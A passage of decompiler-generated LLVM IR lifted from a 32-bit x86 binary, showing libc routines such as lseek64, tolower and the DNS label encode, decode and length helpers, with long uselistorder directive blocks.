218, 215, 216, 222, 219, 220 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8054791, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8054757, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_805470d, { 1, 0 }
  uselistorder label %dec_label_pc_80546f1, { 1, 0 }
  uselistorder label %dec_label_pc_80546b4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805467b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80546a1, { 1, 0 }
  uselistorder label %dec_label_pc_805466f, { 1, 0 }
  uselistorder label %dec_label_pc_8054757.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8054641, { 1, 0 }
  uselistorder label %dec_label_pc_8054606, { 1, 0 }
  uselistorder label %dec_label_pc_805455d, { 1, 0 }
  uselistorder label %dec_label_pc_80544ed, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80547a2 = load i32, i32* @ebx, align 4
  store i32 %v0_80547a2, i32* %stack_var_-12, align 4
  %v2_80547aa = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80547aa, i32* %esi.global-to-local, align 4
  %v1_80547c4 = call i32 @int80_syscall(i32 140)
  store i32 %v1_80547c4, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_80547c4, -4095
  br i1 %tmp16, label %dec_label_pc_80547de, label %dec_label_pc_80547d0

dec_label_pc_80547d0:                             ; preds = %entry
  %v1_80547d0 = call i32 @__errno_location(i32 %arg3)
  %v0_80547d5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80547d5 = sub i32 0, %v0_80547d5
  %v2_80547d7 = inttoptr i32 %v1_80547d0 to i32*
  store i32 %v1_80547d5, i32* %v2_80547d7, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80547e2

dec_label_pc_80547de:                             ; preds = %entry
  %v1_80547de = icmp eq i32 %v1_80547c4, 0
  br i1 %v1_80547de, label %dec_label_pc_80547e7, label %dec_label_pc_80547e2

dec_label_pc_80547e2:                             ; preds = %dec_label_pc_80547de, %dec_label_pc_80547d0
  %v0_80547e2 = phi i32 [ %v1_80547c4, %dec_label_pc_80547de ], [ -1, %dec_label_pc_80547d0 ]
  %v1_80547e4 = ashr i32 %v0_80547e2, 31
  br label %dec_label_pc_80547ef

dec_label_pc_80547e7:                             ; preds = %dec_label_pc_80547de
  %v3_80547e7 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80547ef

dec_label_pc_80547ef:                             ; preds = %dec_label_pc_80547e2, %dec_label_pc_80547e7
  %v0_80547f5 = phi i32 [ %v0_80547e2, %dec_label_pc_80547e2 ], [ %v3_80547e7, %dec_label_pc_80547e7 ]
  %storemerge = phi i32 [ %v1_80547e4, %dec_label_pc_80547e2 ], [ %tmp, %dec_label_pc_80547e7 ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_80547f2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80547f2, i32* @ebx, align 4
  ret i32 %v0_80547f5

; uselistorder directives
  uselistorder i32 %v1_80547c4, { 1, 2, 0, 3 }
  uselistorder i32 31, { 20, 15, 21, 27, 28, 22, 23, 11, 2, 3, 0, 1, 10, 26, 16, 17, 18, 6, 7, 4, 5, 12, 8, 9, 24, 25, 19, 13, 14 }
  uselistorder i32 (i32)* @__errno_location, { 53, 44, 71, 70, 69, 43, 42, 52, 51, 41, 26, 38, 50, 49, 19, 54, 25, 64, 14, 13, 12, 11, 10, 68, 9, 24, 23, 8, 22, 63, 62, 40, 39, 67, 66, 65, 61, 21, 20, 60, 18, 37, 48, 47, 46, 2, 32, 7, 15, 45, 1, 0, 59, 34, 33, 58, 30, 6, 17, 3, 29, 16, 57, 56, 36, 28, 27, 55, 5, 4, 72, 35, 31 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_80547ef, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80547fc = add i32 %arg1, 128
  %v6_8054807 = icmp ugt i32 %v1_80547fc, 383
  br i1 %v6_8054807, label %dec_label_pc_8054812, label %dec_label_pc_8054809

dec_label_pc_8054809:                             ; preds = %entry
  %v0_8054809 = load i32, i32* bitcast (i32** @global_var_805a040.178 to i32*), align 64
  %v2_805480e = mul i32 %arg1, 2
  %v3_805480e = add i32 %v0_8054809, %v2_805480e
  %v4_805480e = inttoptr i32 %v3_805480e to i16*
  %v5_805480e = load i16, i16* %v4_805480e, align 2
  %v6_805480e = sext i16 %v5_805480e to i32
  store i32 %v6_805480e, i32* @edx, align 4
  br label %dec_label_pc_8054812

dec_label_pc_8054812:                             ; preds = %entry, %dec_label_pc_8054809
  %v0_8054812 = phi i32 [ %arg1, %entry ], [ %v6_805480e, %dec_label_pc_8054809 ]
  ret i32 %v0_8054812

; uselistorder directives
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 60, 63, 15, 62, 16, 17, 18, 19, 20, 23, 24, 22, 21, 25, 26, 27, 28, 31, 32, 30, 29, 33, 36, 35, 34, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 51, 52, 53, 49, 54, 50, 56, 55, 57, 59, 58, 61 }
  uselistorder i32 128, { 17, 8, 10, 3, 9, 4, 5, 11, 0, 6, 7, 12, 13, 14, 15, 16, 2, 1, 18 }
  uselistorder label %dec_label_pc_8054812, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8054819 = load i32, i32* @edi, align 4
  %v0_805481a = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8054821 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054821, i32* @edi, align 4
  %v1_80548804 = icmp eq i8* %arg1, null
  br i1 %v1_80548804, label %dec_label_pc_8054889, label %dec_label_pc_8054884.lr.ph

dec_label_pc_8054884.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054884

dec_label_pc_8054827:                             ; preds = %dec_label_pc_8054884
  %v5_805482c = call i32 @__GI_strchr(i8* %v1_8054884, i32 46)
  %v1_8054834 = icmp eq i32 %v5_805482c, 0
  br i1 %v1_8054834, label %dec_label_pc_8054840, label %dec_label_pc_805483a

dec_label_pc_805483a:                             ; preds = %dec_label_pc_8054827
  %v1_805483c = load i32, i32* @edi, align 4
  %v2_805483c = sub i32 %v5_805482c, %v1_805483c
  br label %dec_label_pc_805484e

dec_label_pc_8054840:                             ; preds = %dec_label_pc_8054827
  %v0_8054843 = load i32, i32* @edi, align 4
  %v5_8054843 = inttoptr i32 %v0_8054843 to i8*
  %v3_8054844 = call i32 @strlen(i8* %v5_8054843)
  br label %dec_label_pc_805484e

dec_label_pc_805484e:                             ; preds = %dec_label_pc_805483a, %dec_label_pc_8054840
  %v0_8054861 = phi i32 [ %v3_8054844, %dec_label_pc_8054840 ], [ %v2_805483c, %dec_label_pc_805483a ]
  store i32 %v0_8054861, i32* @esi, align 4
  %v1_805484e = icmp eq i32 %v0_8054861, 0
  %v3_805484e = trunc i32 %v0_8054861 to i8
  br i1 %v1_805484e, label %dec_label_pc_805489d, label %dec_label_pc_8054852

dec_label_pc_8054852:                             ; preds = %dec_label_pc_805484e
  %v1_8054856 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054856 = sub i32 %arg3, %v1_8054856
  %v1_8054858 = add i32 %v2_8054856, -1
  %v7_8054859 = icmp ult i32 %v0_8054861, %v1_8054858
  %v1_805485b = icmp eq i1 %v7_8054859, false
  br i1 %v1_805485b, label %dec_label_pc_805489d, label %dec_label_pc_805485d

dec_label_pc_805485d:                             ; preds = %dec_label_pc_8054852
  store i32 %arg2, i32* @edx, align 4
  %v4_8054863 = add i32 %v1_8054856, %arg2
  %v5_8054863 = inttoptr i32 %v4_8054863 to i8*
  store i8 %v3_805484e, i8* %v5_8054863, align 1
  %v0_8054866 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054866 = add i32 %v0_8054866, 1
  %v0_8054868 = load i32, i32* @edx, align 4
  %v0_805486a = load i32, i32* @esi, align 4
  %v2_805486b = add i32 %v1_8054866, %v0_8054868
  %v0_805486d = load i32, i32* @edi, align 4
  %v2_805486e = add i32 %v0_805486a, %v1_8054866
  store i32 %v2_805486e, i32* %ebx.global-to-local, align 4
  %tmp29 = inttoptr i32 %v2_805486b to i16*
  %v7_8054871 = call i32 @memcpy(i16* %tmp29, i32 %v0_805486d, i32 %v0_805486a)
  %v1_805487d = add i32 %v5_805482c, 1
  br i1 %v1_8054834, label %dec_label_pc_8054889, label %dec_label_pc_8054880

dec_label_pc_8054880:                             ; preds = %dec_label_pc_805485d
  store i32 %v1_805487d, i32* @edi, align 4
  %v1_8054880 = icmp eq i32 %v1_805487d, 0
  br i1 %v1_8054880, label %dec_label_pc_8054889, label %dec_label_pc_8054884

dec_label_pc_8054884:                             ; preds = %dec_label_pc_8054884.lr.ph, %dec_label_pc_8054880
  %v0_805482b = phi i32 [ %v4_8054821, %dec_label_pc_8054884.lr.ph ], [ %v1_805487d, %dec_label_pc_8054880 ]
  %v1_8054884 = inttoptr i32 %v0_805482b to i8*
  %v2_8054884 = load i8, i8* %v1_8054884, align 1
  %v3_8054884 = icmp eq i8 %v2_8054884, 0
  %v1_8054887 = icmp eq i1 %v3_8054884, false
  br i1 %v1_8054887, label %dec_label_pc_8054827, label %dec_label_pc_8054889

dec_label_pc_8054889:                             ; preds = %dec_label_pc_8054880, %dec_label_pc_8054884, %dec_label_pc_805485d, %entry
  %tmp30 = icmp slt i32 %arg3, 1
  br i1 %tmp30, label %dec_label_pc_805489d, label %dec_label_pc_8054890

dec_label_pc_8054890:                             ; preds = %dec_label_pc_8054889
  %v1_8054894 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054894 = add i32 %v1_8054894, %arg2
  %v3_8054894 = inttoptr i32 %v2_8054894 to i8*
  store i8 0, i8* %v3_8054894, align 1
  %v0_8054898 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054898 = add i32 %v0_8054898, 1
  br label %dec_label_pc_80548a0

dec_label_pc_805489d:                             ; preds = %dec_label_pc_8054852, %dec_label_pc_805484e, %dec_label_pc_8054889
  br label %dec_label_pc_80548a0

dec_label_pc_80548a0:                             ; preds = %dec_label_pc_8054890, %dec_label_pc_805489d
  %storemerge2 = phi i32 [ %v1_8054898, %dec_label_pc_8054890 ], [ -1, %dec_label_pc_805489d ]
  store i32 %v0_805481a, i32* @esi, align 4
  store i32 %v0_8054819, i32* @edi, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %v1_8054884, { 1, 0 }
  uselistorder i32 %v1_805487d, { 0, 2, 1 }
  uselistorder i32 %v0_805486a, { 1, 0 }
  uselistorder i32 %v5_805482c, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 2, 7, 6, 1, 0, 5, 4, 3, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 3, 4, 5, 6, 7, 8, 0, 1, 2 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12 }
  uselistorder label %dec_label_pc_80548a0, { 1, 0 }
  uselistorder label %dec_label_pc_805489d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054889, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8054884, { 1, 0 }
  uselistorder label %dec_label_pc_805484e, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_80548aa = load i32, i32* @esi, align 4
  %v4_80548af = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_80548af, label %dec_label_pc_8054976, label %dec_label_pc_80548be

dec_label_pc_80548be:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_805495e2541 = add i32 %arg2, %arg1
  %v3_805495e2642 = inttoptr i32 %v2_805495e2541 to i8*
  %v4_805495e2743 = load i8, i8* %v3_805495e2642, align 1
  %v1_80549622945 = icmp eq i8 %v4_805495e2743, 0
  %v1_80549643046 = icmp eq i1 %v1_80549622945, false
  br i1 %v1_80549643046, label %dec_label_pc_80548cc.lr.ph, label %dec_label_pc_805496a

dec_label_pc_80548cc:                             ; preds = %dec_label_pc_80548cc.lr.ph, %dec_label_pc_80548e5
  %v0_80548d6 = phi i32 [ %v0_80548d6.pre, %dec_label_pc_80548cc.lr.ph ], [ %v4_80548f6, %dec_label_pc_80548e5 ]
  %v8_80548cc37 = phi i1 [ %v8_80548cc3151, %dec_label_pc_80548cc.lr.ph ], [ true, %dec_label_pc_80548e5 ]
  %v5_805495e36.in = phi i8 [ %v5_805495e2850.in, %dec_label_pc_80548cc.lr.ph ], [ %v4_805495e, %dec_label_pc_80548e5 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_80548cc.lr.ph ], [ 0, %dec_label_pc_80548e5 ]
  %v0_80548d334 = phi i32 [ %v0_80548d3.ph47, %dec_label_pc_80548cc.lr.ph ], [ %v2_8054904, %dec_label_pc_80548e5 ]
  %v5_805495e36 = zext i8 %v5_805495e36.in to i32
  %v1_80548d3 = add i32 %v0_80548d334, 1
  store i32 %v1_80548d3, i32* @esi, align 4
  %v3_80548d6 = select i1 %v8_80548cc37, i32 2, i32 1
  %v4_80548d6 = add i32 %v3_80548d6, %v0_80548d6
  store i32 %v4_80548d6, i32* %ebp.global-to-local, align 4
  %v1_80548d9 = and i32 %v5_805495e36, 192
  %v6_80548de = icmp eq i32 %v1_80548d9, 192
  %v1_80548e3 = icmp eq i1 %v6_80548de, false
  br i1 %v1_80548e3, label %dec_label_pc_8054908, label %dec_label_pc_80548e5

dec_label_pc_80548e5:                             ; preds = %dec_label_pc_80548cc
  %v2_80548f2 = add i32 %v1_80548d3, %arg1
  %v3_80548f2 = inttoptr i32 %v2_80548f2 to i8*
  %v4_80548f2 = load i8, i8* %v3_80548f2, align 1
  %v5_80548f2 = zext i8 %v4_80548f2 to i32
  %v4_80548f6 = add i32 %v3_80548d6, %v4_80548d6
  store i32 %v4_80548f6, i32* %ebp.global-to-local, align 4
  %v1_80548f9 = mul nuw nsw i32 %v5_805495e36, 256
  %v2_80548fc = and i32 %v1_80548f9, 16128
  %v2_8054904 = or i32 %v5_80548f2, %v2_80548fc
  store i32 %v2_8054904, i32* @edx, align 4
  store i32 %v1_8054925.ph48, i32* @ecx, align 4
  %v2_805495e = add i32 %v2_8054904, %arg1
  %v3_805495e = inttoptr i32 %v2_805495e to i8*
  %v4_805495e = load i8, i8* %v3_805495e, align 1
  %v1_8054962 = icmp eq i8 %v4_805495e, 0
  %v1_8054964 = icmp eq i1 %v1_8054962, false
  br i1 %v1_8054964, label %dec_label_pc_80548cc, label %dec_label_pc_805496a

dec_label_pc_8054908:                             ; preds = %dec_label_pc_80548cc
  %v2_8054908 = add i32 %v5_805495e36, %v1_8054925.ph48
  %v1_805490d = add i32 %v2_8054908, 1
  store i32 %v1_805490d, i32* @edi, align 4
  %v10_805490e = icmp ult i32 %v1_805490d, %arg4
  %v1_8054916 = icmp eq i1 %v10_805490e, false
  br i1 %v1_8054916, label %dec_label_pc_8054976, label %dec_label_pc_8054918

dec_label_pc_8054918:                             ; preds = %dec_label_pc_8054908
  %v2_805491e = add i32 %v1_80548d3, %arg1
  %v2_8054925 = add i32 %v1_8054925.ph48, %arg3
  %v3_8054928 = inttoptr i32 %v2_8054925 to i16*
  %v4_8054928 = call i32 @memcpy(i16* %v3_8054928, i32 %v2_805491e, i32 %v5_805495e36)
  %v0_8054934 = load i32, i32* %ebp.global-to-local, align 4
  %v0_805493d = load i32, i32* @esi, align 4
  %v2_805493d = add i32 %v0_805493d, %v5_805495e36
  store i32 %v2_805493d, i32* @edx, align 4
  %v1_8054944 = icmp eq i1 %v8_80548cc37, false
  %v2_8054934 = select i1 %v1_8054944, i32 %v5_805495e36, i32 0
  %v4_8054944 = add i32 %v0_8054934, %v2_8054934
  store i32 %v4_8054944, i32* %ebp.global-to-local, align 4
  %v4_8054955 = add i32 %v2_8054908, %arg3
  %v5_8054955 = inttoptr i32 %v4_8054955 to i8*
  store i8 46, i8* %v5_8054955, align 1
  %v0_8054958.pre = load i32, i32* @edi, align 4
  %v1_805495e.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_8054958.pre, i32* @ecx, align 4
  %v2_805495e25 = add i32 %v1_805495e.pre.pre, %arg1
  %v3_805495e26 = inttoptr i32 %v2_805495e25 to i8*
  %v4_805495e27 = load i8, i8* %v3_805495e26, align 1
  %v1_805496229 = icmp eq i8 %v4_805495e27, 0
  %v1_805496430 = icmp eq i1 %v1_805496229, false
  %v8_80548cc31 = icmp eq i8 %stack_var_-17.135, 0
  %v0_80548d6.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805496430, label %dec_label_pc_80548cc.lr.ph, label %dec_label_pc_805496a

dec_label_pc_80548cc.lr.ph:                       ; preds = %dec_label_pc_8054918, %dec_label_pc_80548be
  %v0_80548d6.pre = phi i32 [ 0, %dec_label_pc_80548be ], [ %v0_80548d6.pre.pre, %dec_label_pc_8054918 ]
  %v8_80548cc3151 = phi i1 [ false, %dec_label_pc_80548be ], [ %v8_80548cc31, %dec_label_pc_8054918 ]
  %v5_805495e2850.in = phi i8 [ %v4_805495e2743, %dec_label_pc_80548be ], [ %v4_805495e27, %dec_label_pc_8054918 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_80548be ], [ %stack_var_-17.135, %dec_label_pc_8054918 ]
  %v1_8054925.ph48 = phi i32 [ 0, %dec_label_pc_80548be ], [ %v0_8054958.pre, %dec_label_pc_8054918 ]
  %v0_80548d3.ph47 = phi i32 [ %arg2, %dec_label_pc_80548be ], [ %v1_805495e.pre.pre, %dec_label_pc_8054918 ]
  br label %dec_label_pc_80548cc

dec_label_pc_805496a:                             ; preds = %dec_label_pc_8054918, %dec_label_pc_80548e5, %dec_label_pc_80548be
  %v0_805496f = phi i32 [ 0, %dec_label_pc_80548be ], [ %v4_80548f6, %dec_label_pc_80548e5 ], [ %v0_80548d6.pre.pre, %dec_label_pc_8054918 ]
  %v8_80548cc.lcssa = phi i1 [ false, %dec_label_pc_80548be ], [ true, %dec_label_pc_80548e5 ], [ %v8_80548cc31, %dec_label_pc_8054918 ]
  %v2_8054971 = zext i1 %v8_80548cc.lcssa to i32
  %v3_8054971 = add i32 %v0_805496f, 1
  %v4_8054971 = add i32 %v3_8054971, %v2_8054971
  br label %dec_label_pc_8054979

dec_label_pc_8054976:                             ; preds = %dec_label_pc_8054908, %entry
  br label %dec_label_pc_8054979

dec_label_pc_8054979:                             ; preds = %dec_label_pc_805496a, %dec_label_pc_8054976
  %storemerge = phi i32 [ %v4_8054971, %dec_label_pc_805496a ], [ -1, %dec_label_pc_8054976 ]
  store i32 %v0_80548aa, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8054925.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_805495e, { 1, 0 }
  uselistorder i32 %v2_8054904, { 0, 2, 1 }
  uselistorder i32 %v4_80548f6, { 0, 2, 1 }
  uselistorder i32 %v5_805495e36, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 3, 15, 18, 6, 0, 17, 13, 1, 11, 12, 7, 8, 9, 4, 5, 14, 2, 16, 10 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 8, 9, 10, 11, 12, 13, 14, 16, 2, 3, 17, 18, 20, 0, 1, 15, 4, 5, 6, 19, 7 }
  uselistorder i32* @edi, { 3, 173, 174, 21, 175, 176, 177, 20, 178, 179, 180, 2, 0, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 29, 5, 4, 30, 31, 32, 33, 34, 37, 35, 36, 196, 7, 197, 8, 198, 199, 6, 200, 201, 202, 203, 208, 209, 1, 204, 205, 206, 207, 210, 211, 212, 213, 106, 9, 107, 108, 109, 214, 215, 223, 224, 225, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 94, 95, 96, 97, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 10, 121, 122, 123, 124, 125, 126, 127, 329, 330, 331, 11, 332, 333, 336, 337, 286, 287, 288, 45, 46, 47, 338, 339, 354, 48, 12, 49, 50, 38, 39, 40, 41, 42, 43, 44, 164, 165, 166, 167, 168, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 51, 52, 53, 54, 55, 56, 57, 311, 312, 313, 314, 315, 316, 317, 318, 13, 319, 320, 321, 322, 323, 256, 257, 14, 258, 259, 260, 261, 262, 263, 264, 275, 276, 277, 278, 279, 128, 129, 15, 130, 352, 353, 131, 132, 133, 16, 234, 235, 226, 227, 228, 229, 230, 231, 232, 233, 58, 59, 60, 236, 237, 238, 134, 135, 136, 137, 138, 139, 140, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 17, 155, 26, 27, 28, 141, 18, 142, 143, 348, 349, 350, 351, 239, 240, 241, 242, 243, 244, 156, 157, 158, 159, 216, 217, 218, 219, 220, 221, 222, 334, 335, 169, 170, 284, 285, 61, 62, 63, 289, 290, 345, 346, 347, 64, 19, 65, 66, 67, 68, 291, 292, 69, 70, 71, 340, 341, 342, 343, 344, 72, 73, 74, 77, 75, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 98, 99, 100, 101, 102, 103, 104, 105, 160, 161, 162, 163, 22, 23, 24, 25, 171, 172, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 280, 281, 282, 283, 293, 294, 295, 324, 325, 326, 327, 328 }
  uselistorder i32 256, { 5, 6, 7, 8, 9, 47, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 46, 21, 22, 23, 24, 25, 0, 1, 26, 2, 48, 27, 28, 54, 29, 30, 4, 51, 52, 3, 31, 32, 33, 34, 49, 35, 36, 37, 38, 39, 40, 41, 42, 50, 55, 43, 53, 44, 45 }
  uselistorder i1 true, { 1, 3, 7, 8, 9, 10, 11, 12, 2, 5, 6, 4, 0 }
  uselistorder i32* @edx, { 4, 150, 151, 152, 153, 154, 155, 156, 17, 160, 158, 159, 161, 162, 163, 164, 165, 166, 167, 45, 49, 46, 47, 48, 168, 169, 170, 171, 172, 173, 174, 181, 175, 176, 177, 178, 179, 180, 1, 18, 92, 101, 102, 182, 103, 104, 105, 106, 107, 196, 183, 184, 185, 200, 201, 202, 203, 213, 5, 2, 19, 93, 108, 109, 186, 187, 6, 188, 189, 190, 191, 110, 111, 112, 113, 114, 115, 282, 283, 284, 285, 7, 286, 287, 219, 220, 52, 50, 221, 291, 292, 299, 298, 289, 82, 51, 224, 225, 8, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 9, 239, 240, 222, 223, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 10, 68, 69, 70, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 11, 266, 267, 268, 269, 270, 294, 71, 204, 205, 207, 0, 157, 206, 81, 116, 192, 193, 194, 72, 195, 117, 118, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 16, 136, 137, 119, 138, 12, 139, 140, 142, 13, 143, 144, 145, 146, 147, 44, 14, 141, 290, 197, 198, 199, 15, 148, 214, 215, 288, 149, 293, 212, 295, 281, 73, 216, 217, 74, 209, 218, 75, 296, 297, 76, 77, 78, 79, 80, 83, 84, 85, 86, 87, 88, 89, 90, 91, 94, 95, 96, 97, 98, 99, 100, 20, 21, 22, 24, 25, 23, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 208, 210, 211, 271, 272, 273, 274, 276, 280, 275, 278, 279, 3, 277, 300 }
  uselistorder i32* @esi, {}
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_8054979, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8054992 = icmp eq i32 %arg1, 0
  br i1 %v1_8054992, label %dec_label_pc_80549c1, label %dec_label_pc_80549b2.preheader

dec_label_pc_80549b2.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_80549b210 = add i32 %arg2, %arg1
  %v3_80549b211 = inttoptr i32 %v2_80549b210 to i8*
  %v4_80549b212 = load i8, i8* %v3_80549b211, align 1
  %v1_80549b614 = add i32 %arg2, 1
  %v1_80549b915 = icmp eq i8 %v4_80549b212, 0
  %v1_80549bb16 = icmp eq i1 %v1_80549b915, false
  br i1 %v1_80549bb16, label %dec_label_pc_80549a1, label %dec_label_pc_80549bd

dec_label_pc_8054998:                             ; preds = %dec_label_pc_80549a1
  %v1_8054998 = add i32 %v0_805499817, 2
  br label %dec_label_pc_80549bd

dec_label_pc_80549a1:                             ; preds = %dec_label_pc_80549b2.preheader, %dec_label_pc_80549b2
  %v1_80549b619 = phi i32 [ %v1_80549b6, %dec_label_pc_80549b2 ], [ %v1_80549b614, %dec_label_pc_80549b2.preheader ]
  %v5_80549b218.in = phi i8 [ %v4_80549b2, %dec_label_pc_80549b2 ], [ %v4_80549b212, %dec_label_pc_80549b2.preheader ]
  %v0_805499817 = phi i32 [ %v2_80549af, %dec_label_pc_80549b2 ], [ %arg2, %dec_label_pc_80549b2.preheader ]
  %v5_80549b218 = zext i8 %v5_80549b218.in to i32
  %v1_80549a3 = and i32 %v5_80549b218, 192
  %v6_80549a8 = icmp eq i32 %v1_80549a3, 192
  %v2_80549af = add i32 %v5_80549b218, %v1_80549b619
  br i1 %v6_80549a8, label %dec_label_pc_8054998, label %dec_label_pc_80549b2

dec_label_pc_80549b2:                             ; preds = %dec_label_pc_80549a1
  store i32 %v2_80549af, i32* @ecx, align 4
  %v2_80549b2 = add i32 %v2_80549af, %arg1
  %v3_80549b2 = inttoptr i32 %v2_80549b2 to i8*
  %v4_80549b2 = load i8, i8* %v3_80549b2, align 1
  %v1_80549b6 = add i32 %v2_80549af, 1
  %v1_80549b9 = icmp eq i8 %v4_80549b2, 0
  %v1_80549bb = icmp eq i1 %v1_80549b9, false
  br i1 %v1_80549bb, label %dec_label_pc_80549a1, label %dec_label_pc_80549bd

dec_label_pc_80549bd:                             ; preds = %dec_label_pc_80549b2.preheader, %dec_label_pc_80549b2, %dec_label_pc_8054998
  %v0_80549bd = phi i32 [ %v1_8054998, %dec_label_pc_8054998 ], [ %v1_80549b614, %dec_label_pc_80549b2.preheader ], [ %v1_80549b6, %dec_label_pc_80549b2 ]
  %v2_80549bf = sub i32 %v0_80549bd, %arg2
  br label %dec_label_pc_80549c1

dec_label_pc_80549c1:                             ; preds = %entry, %dec_label_pc_80549bd
  %v0_80549c4 = phi i32 [ -1, %entry ], [ %v2_80549bf, %dec_label_pc_80549bd ]
  ret i32 %v0_80549c4

; uselistorder directives
  uselistorder i8 %v4_80549b2, { 1, 0 }
  uselistorder i32 %v2_80549af, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 2, { 133, 48, 134, 76, 138, 139, 45, 46, 47, 0, 1, 135, 140, 141, 142, 111, 143, 144, 145, 146, 147, 148, 117, 2, 118, 119, 52, 149, 150, 3, 77, 53, 123, 124, 72, 151, 152, 153, 155, 112, 168, 169, 58, 125, 126, 73, 8, 9, 62, 63, 176, 59, 110, 7, 78, 104, 79, 105, 80, 106, 54, 10, 122, 50, 81, 11, 12, 64, 13, 14, 120, 15, 16, 17, 65, 171, 18, 19, 74, 20, 156, 157, 158, 159, 4, 66, 166, 167, 136, 137, 162, 163, 55, 56, 57, 21, 177, 67, 5, 6, 127, 128, 61, 22, 23, 129, 24, 130, 25, 68, 131, 132, 26, 154, 170, 175, 75, 27, 121, 28, 82, 85, 83, 84, 86, 29, 30, 31, 32, 33, 34, 35, 36, 37, 69, 38, 39, 40, 41, 42, 43, 87, 107, 88, 70, 89, 108, 90, 91, 109, 60, 92, 93, 94, 113, 114, 115, 116, 95, 96, 97, 98, 160, 49, 161, 164, 99, 51, 165, 100, 101, 102, 174, 71, 172, 44, 173, 103 }
